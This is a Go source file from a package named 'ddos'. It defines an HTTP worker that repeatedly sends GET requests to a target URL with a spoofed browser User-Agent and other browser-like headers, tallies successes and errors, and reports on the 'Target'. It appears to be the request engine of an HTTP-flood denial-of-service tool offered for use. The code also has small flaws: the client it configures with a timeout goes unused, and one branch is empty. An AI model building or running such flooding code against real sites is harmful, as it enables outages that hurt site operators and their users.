package ddos

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"time"
)

type NetHttp struct {
	client        *http.Client
	host          string
	url           string
	totalRequests total
	totalErrors   total
	bodProd       bodyStreamProducer
	debug         bool
}

func newNetHttp(url string, debug bool) *NetHttp {
	f := new(NetHttp)
	f.client = &http.Client{}
	f.client.Timeout = time.Millisecond * 500
	f.url = url
	f.debug = debug
	return f
}

func (c *NetHttp) Do() {
	req, _ := http.NewRequest("GET", c.url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		c.totalErrors.Inc()
		return
	}
	if resp.StatusCode < 400 {
		c.totalRequests.Inc()
	}
	if resp.StatusCode > 400 {

	}
	if c.debug {
		if err != nil {
			fmt.Println(err.Error())
		}
		fmt.Printf("Response status: %d, Target: %s\n", resp.StatusCode, c.url)
	}
	defer resp.Body.Close()
	io.Copy(ioutil.Discard, resp.Body)
}

func (c *NetHttp) GetUrl() string {
	return c.url
}

func (c *NetHttp) GetTotal() total {
	return c.totalRequests
}

func (c *NetHttp) GetError() total {
	return c.totalErrors
}
